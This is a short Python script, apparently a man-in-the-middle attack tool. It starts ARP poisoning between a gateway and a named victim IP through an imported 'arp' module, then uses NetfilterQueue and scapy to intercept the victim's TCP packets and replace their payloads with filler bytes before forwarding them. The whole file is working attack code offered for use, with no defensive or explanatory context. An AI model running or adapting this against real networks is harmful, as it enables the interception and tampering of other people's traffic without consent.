import sys 
from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ


import arp


def detect_and_alter_packet(packet):   
    octets = packet.get_payload()
    scapy_packet = IP(octets)
    
    if IP in scapy_packet and TCP in scapy_packet:
        if len(scapy_packet[TCP].payload) > 0 and scapy_packet[TCP].flags & 0x08: # PSH flag
            print("Before: ", scapy_packet[TCP].payload)
            scapy_packet = alter_packet(scapy_packet)
            print("After: ", scapy_packet[TCP].payload, end="\n\n")
            
            packet.set_payload(bytes(scapy_packet))
    
    packet.accept()

def alter_packet(packet):     
    payload = bytes(packet[Raw].load)
    payload = b"a" * len(packet[Raw].load)
    
    packet[Raw].load = payload
    
    del packet[IP].len 
    del packet[IP].chksum
    del packet[TCP].chksum
    
    return packet
if __name__ == "__main__":
    if (len(sys.argv) != 3):
        print("need 2 arguments")
        exit()
    
    router_ip = sys.argv[1]
    victim_ip = sys.argv[2]

    router_mac = arp.get_mac(router_ip)
    if (router_mac is None):
        print("Unable to get MAC of default gateway.")
        sys.exit(0)
    victim_mac = arp.get_mac(victim_ip)
    if (victim_mac is None):
        print("Unable to get MAC of victim.")
        sys.exit(0)

    print(f"[*] Default Gateway MAC: {router_mac}")
    print(f"[*] Victim MAC: {victim_mac}")

    attack_thread = threading.Thread(target=arp.arp_poison, args=(router_ip, router_mac, victim_ip, victim_mac))
    attack_thread.start()

    nfq = NFQ()
    nfq.bind(5, detect_and_alter_packet)
    try:
        nfq.run()
    except KeyboardInterrupt:
        print('')
    
    nfq.unbind()